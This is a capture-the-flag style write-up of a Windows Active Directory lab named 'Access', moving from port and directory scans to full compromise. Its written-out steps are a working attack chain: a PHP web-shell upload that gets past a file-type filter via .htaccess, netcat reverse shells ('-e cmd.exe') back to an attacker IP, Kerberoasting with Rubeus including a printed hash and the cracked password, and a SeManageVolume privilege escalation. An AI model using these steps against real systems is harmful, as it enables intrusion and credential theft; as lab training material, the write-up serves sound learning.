# Access Lab
## Reconnaissance
### All port scanning
#### TCP Ports
- `nmap -p- -T4 -sS -min-rate 1000 192.168.225.187`<br>![Scan](/1.Access/images/All_port_scan.png)
- `nmap -A -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001 192.168.225.187`

    ```
    Service scan Timing: About 18.75% done; ETC: 12:48 (0:00:30 remaining)
    Nmap scan report for 192.168.225.187
    Host is up (0.11s latency).

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
    |_http-title: Access The Event
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-12 07:17:58Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn?
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
    443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Access The Event
    |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
    | http-methods: 
    |_  Potentially risky methods: TRACE
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2009-11-10T23:48:47
    |_Not valid after:  2019-11-08T23:48:47
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  adws?
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port139-TCP:V=7.99%I=7%D=7/12%Time=6A533FA4%P=x86_64-pc-linux-gnu%r(Get
    SF:Request,5,"\x83\0\0\x01\x8f");
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (95%)
    OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
    Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1909 - 2004 (94%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows 11 24H2 - 25H2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 20H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 4 hops
    Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time: 
    |   date: 2026-07-12T07:18:19
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3.1.1: 
    |_    Message signing enabled and required

    TRACEROUTE (using port 443/tcp)
    HOP RTT       ADDRESS
    1   109.78 ms 192.168.45.1
    2   109.75 ms 192.168.45.254
    3   109.78 ms 192.168.251.1
    4   109.79 ms 192.168.225.187
    ```
    > as **http** is open and is showing php there could be some way to exploit it and gain shell also the server is running on windows.
#### UDP Ports
- `nmap -sU -A --top-ports 20 192.168.225.187`<br>![Scan](/1.Access/images/All_port_scan.png)

### Web Scanning
> we will first visit the website via `https://192.168.225.187/` and look for some impotant details.

![Webpage](/1.Access/images/web_page.png)<br>
<div align="center">

![Domainname](/1.Access/images/web_page_domain_name.png)
</div>

- We have found the domain name for the webpage let's do the hostname resolution in `/etc/hosts` file.
- Now, we can get access to website with url - `http://example.com/`
- Buy ticket feature in the website can give us file upload vulnerability ![File_upload](/1.Access//images/file_upload.png)
- By viewing page source we have also found the theme which was used to make this website so by follwoing this link we can also download the theme and understand it's file structure ![file_structure](/1.Access/images/Themes.png)
#### Sub-directory enumeration
- `gobuster dir -u http://192.168.225.187 -w /usr/share/wordlists/dirb/common.txt`

    ```
    ===============================================================
    Gobuster v3.8.2
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.225.187
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8.2
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    .hta                 (Status: 403) [Size: 304]
    .htaccess            (Status: 403) [Size: 304]
    .htpasswd            (Status: 403) [Size: 304]
    assets               (Status: 301) [Size: 343] [--> http://192.168.225.187/assets/]
    aux                  (Status: 403) [Size: 304]
    cgi-bin/             (Status: 403) [Size: 304]
    com3                 (Status: 403) [Size: 304]
    com1                 (Status: 403) [Size: 304]
    com2                 (Status: 403) [Size: 304]
    con                  (Status: 403) [Size: 304]
    examples             (Status: 503) [Size: 404]
    forms                (Status: 301) [Size: 342] [--> http://192.168.225.187/forms/]
    index.html           (Status: 200) [Size: 49680]
    licenses             (Status: 403) [Size: 423]
    lpt2                 (Status: 403) [Size: 304]
    lpt1                 (Status: 403) [Size: 304]
    nul                  (Status: 403) [Size: 304]
    phpmyadmin           (Status: 403) [Size: 423]
    prn                  (Status: 403) [Size: 304]
    server-status        (Status: 403) [Size: 423]
    server-info          (Status: 403) [Size: 423]
    uploads              (Status: 301) [Size: 344] [--> http://192.168.225.187/uploads/]
    webalizer            (Status: 403) [Size: 423]
    Progress: 4376 / 4613 (94.86%)[ERROR] error on word Utilities: timeout occurred during the request
    [ERROR] error on word utility: timeout occurred during the request
    Progress: 4613 / 4613 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    ```
#### Sub-Domain enumeration
- this did'nt workout as there were no subdomins within `example.com`

## Exploitation
### File upload vulnerability
- We will use file upload vulnerability using buy tickets file upload vector, and upload php reverseshell payload. [**Php_reverse_shell**](/OSCP-LABS/1.Access/www_webshell.php)
- But this type of file is not allowed for uploading into website.![not_allowed](/OSCP-LABS/1.Access/images/not_allowed.png)
- So, we will try to upload `.htaccess` file to change the servers configuration such that it will read `.` files as `PHP`. As, Apache files uses `.htaccess`
- We will use this payload inside .htaccess file `AddType application/x-httpd-php .evil` and rename the reverse shell payload to `www_webshell.evil`.
- Upload Both files to website using Buy Tickets.
- Browse to the `/uploads` and upload `nc64.exe` (or fetch it via python http-server) and then write the command `nc64.exe <tun_0_ip> <port> -e cmd.exe`
- Open terminal and turn on netcat listner `nc -nlvp <port>`
- Reverse Shell got.
### Privelage Escalation

```pwsh
PS C:\xampp\htdocs\uploads> net users
net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
```

- We will also upload [PowerView.ps1](/1.Access/sources/PowerView.ps1) to know about the target

```pwsh
PS C:\xampp\htdocs\uploads> Get-netuser svc_mssql
Get-netuser svc_mssql


company                       : Access
logoncount                    : 1
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=MSSQL,CN=Users,DC=access,DC=offsec
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 4/8/2022 2:40:02 AM
name                          : MSSQL
objectsid                     : S-1-5-21-537427935-490066102-1511301751-1104
samaccountname                : svc_mssql
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 7/6/2022 5:23:18 PM
instancetype                  : 4
usncreated                    : 16414
objectguid                    : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : MSSQLSvc/DC.access.offsec
givenname                     : MSSQL
lastlogon                     : 4/8/2022 2:40:02 AM
badpwdcount                   : 0
cn                            : MSSQL
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 4/8/2022 9:39:43 AM
primarygroupid                : 513
pwdlastset                    : 5/21/2022 5:33:45 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 73754
```

- We can see that this account is configured with a **`serviceprincipalname`** or `SPN`. Armed with this information, we can perform a kerberoasting attack.
- We will download and run [Rubeus.exe](/1.Access/sources/Rubeus.exe)
i got
```pwsh
PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
./Rubeus.exe kerberoast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 5:33:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$CB616FCB9CCFFBDEAF5703C90746836F$85DD2D3E2A99BD4021D3D9B9AC124D86144B992CEA17B92B73A89A5E2DBCEC32D840B289AB13362B00F9C37FAB694EBDD4D775F0B7982C56FF7065E2FDCBF69915B18B391B895F724BB0B5F3D8D288FB45470B49B062FA941DF04B09C6560C87F79D529A6A62C4E964172ECCEB65B5C26AFEFE4DBCFDF8B29522F0A86A587E68AD53A97B0EBEE8AEF9161883C35BFF21CBD1A72664715CF30AAECE5154EB094C6ABEE0691A3650EA0DFBEA98EDC899D90E78403D0CFEB71228ACB44DB4F77F0344A415FB16502D69D74D74513A77084F81531E14CC93387D3A4F4254026C6DB9916FD9B82143698B6E247742C071B40B081D097C276704D3193121FFE6B2D8091F9C7B4F3B356435FDEB0CEFA1966870D164BA403FCA1345577C944B9692C18DB5ACEC0E990946CAB6D848888A7C9BAA734775694D7B488C8E89100F05D90EB4F565CA5C98F7E91D90A2376BE7868A0728445DB92D05E0DE83AE626FF6284170FFBE7BF0CC8167E8B0A6050A46215714350D4EE53286A8EAEA40951D33291632D604622F1E7AB212F6BDE6C6736F6E5C0F50CAF8BE1E9DC6F17A383047DB5DEE9FDB610A444A990A0D60B946A89931DB94AB96FCF25D72C194109AAA45D93D1EB6DE6C0A5C098658DD54303F8688E5B89F6B892166F56C7F5937D1445D29755EF35AA2CDE68DD41A29F02BB56A6CCCCEF777E372F9D16BE26BC3327E14FCA9486A9F6B2C2DA446AA4A4EDC2B3B4567B15AA6ACA43783D92952EBDCF61461A1A44303F1E5DB56E3402FA391E00BFB80CD80BA1A729ECC448918C90C2D706BF9ABED09459305D8A7EABCC3B0166C02D3E40E3DCB1FC60DEBE73E785895ABB097413766DB21BD913DCC72C67B2F40312E42CEDFF7FE6D52FDE3BBE6D427F63213F009A14949E9FCAE41BFA06602C49E858FFEE2DBA4EF273D85660AC870766E686383878B7E1449D11FA82EE1EF424104BE82ACE37D147541A7D622D41C7140CBB61D40CC3FF789E297D5BEC01BA31958D725B39EC4BAA6229E319ABE65217440D4058FC8978CA2371B00E53E2C1039B2E83132DADBD9D8C75B17EA1220A7D188D4D4855FB9A77750B0D2CA0CD3E2F35AA85A8BE7F1BF2F65385C09C753EE841624FE128B10BBDD21F1927ED6BDAA4AF4E956E9DD343A3841AB156AE88AD372C1C0B77B7094C67F21CA0DE3A108F27370C7F8765C75523422AD37BFF34D1C4AAB89EE4D788D16E65208D84C004E07CEA4A1B911820B0E2A536CF8689CC3925BBBD0051226F68909858BD5085A6F504E7DFCDF52176A011B762CB99F7D933C3855EF907CF13963084E852B7E59ED8B56C4CE4C7D4C8F29F820D179F7C640907305AAFA46BEAB6173B109EF1735063F99B50A92EF22079227F9A7B20745AA2BAEA4775F356A72076E768682C74583B777076EC59EAE8D734023DAEE7A046CC6B08D989621449406EEDA78B2D15B3D21B5E4CD0E877A8B2EF1F62D37D53CFE81A69B1C6DAE81470585A458684E8D617676A500E4587AE1D3B115B4EFBC8C375D10A4DC8BE758D21D958CA42857E01F718D17E86ADA6694D211FDE8F73BAAB46A255A54CD9F12E3FFF5CB0581101D6D4DC6522B6518
```

- Let's copy the hash and save in out kali system as `mssql.hash` then try to decrypt it using hashcat.
- We got the password as `trustno1`.
- Now we will privelage escalate to `svc_mssql` using [Invoke-RunAsCs](/1.Access/sources/PowerView.ps1)
    ```pwsh
    PS C:\xampp\htdocs\uploads> import-module ./Invoke-RunasCs.ps1
    import-module ./Invoke-RunasCs.ps1
    PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 whoami
    Invoke-RunasCs svc_mssql trustno1 whoami
    access\svc_mssql
    ```
- Start nc in kali
- `invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.45.233 1234 -e cmd.exe'`
    #### OUTPUT
    ```bash
    ┌──(G1㉿G1)-[~]
    └─$ nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [192.168.45.233] from (UNKNOWN) [192.168.182.187] 50722
    Microsoft Windows [Version 10.0.17763.2746]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>
    ```
- **now grab the flag from desktop**

#### Logging in as svc_mssql
```pwsh
PS C:\users\svc_mssql\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
PS C:\users\svc_mssql\Desktop>
```

- We will use  [SeManageVolumeExploit.exe](/1.Access/sources/SeManageVolumeExploit.exe) to exploit the Hard-disk of the target.
```pwsh
PS C:\xampp\htdocs\uploads> ./SeManageVolumeExploit.exe
./SeManageVolumeExploit.exe
Entries changed: 925
DONE
PS C:\xampp\htdocs\uploads> icacls C://
icacls C://
C:// NT AUTHORITY\SYSTEM:(OI)(CI)(F)
     BUILTIN\Users:(OI)(CI)(F)
     BUILTIN\Users:(OI)(CI)(RX)
     BUILTIN\Users:(CI)(AD)
     BUILTIN\Users:(CI)(IO)(WD)
     CREATOR OWNER:(OI)(CI)(IO)(F)
Successfully processed 1 files; Failed processing 0 files
PS C:\xampp\htdocs\uploads> icacls C://Windows
icacls C://Windows
C://Windows NT SERVICE\TrustedInstaller:(F)
            NT SERVICE\TrustedInstaller:(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(M)
            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
            BUILTIN\Users:(M)
            BUILTIN\Users:(OI)(CI)(IO)(F)
            BUILTIN\Users:(RX)
            BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
            CREATOR OWNER:(OI)(CI)(IO)(F
            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
```
- Now we go to Administrator's Desktop and grab the flag
#### Privelage Escalating to System

# SOLVED!